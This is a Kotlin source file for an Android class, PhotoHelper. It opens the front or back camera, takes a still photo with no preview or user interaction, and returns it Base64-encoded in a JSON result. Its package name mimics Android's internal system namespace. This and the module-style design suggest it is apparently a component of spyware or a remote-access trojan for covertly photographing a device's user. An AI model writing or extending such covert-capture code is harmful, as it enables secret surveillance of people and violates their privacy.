package com.android.internal.svc.modules

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import org.json.JSONObject
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class PhotoHelper(private val context: Context) {

    fun capture(facing: String): JSONObject {
        val cm = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val targetFacing = if (facing == "front") {
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
        } else {
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
        }

        val cameraId = cm.cameraIdList.firstOrNull { id ->
            val chars = cm.getCameraCharacteristics(id)
            chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) == targetFacing
        } ?: return JSONObject().put("error", "no $facing camera found")

        val thread = HandlerThread("camera").apply { start() }
        val handler = Handler(thread.looper)
        val latch = CountDownLatch(1)
        var imageData: ByteArray? = null

        val reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
        reader.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage()
            if (image != null) {
                val buffer = image.planes[0].buffer
                imageData = ByteArray(buffer.remaining())
                buffer.get(imageData!!)
                image.close()
                latch.countDown()
            }
        }, handler)

        try {
            cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val surfaces = listOf(reader.surface)
                    camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            req.addTarget(reader.surface)
                            session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {}, handler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            latch.countDown()
                        }
                    }, handler)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); latch.countDown() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); latch.countDown() }
            }, handler)
        } catch (e: SecurityException) {
            thread.quitSafely()
            return JSONObject().put("error", "camera permission denied")
        }

        latch.await(10, TimeUnit.SECONDS)
        thread.quitSafely()

        return if (imageData != null) {
            JSONObject().apply {
                put("status", "captured")
                put("facing", facing)
                put("size", imageData!!.size)
                put("data", Base64.encodeToString(imageData, Base64.NO_WRAP))
            }
        } else {
            JSONObject().put("error", "capture timeout")
        }
    }
}
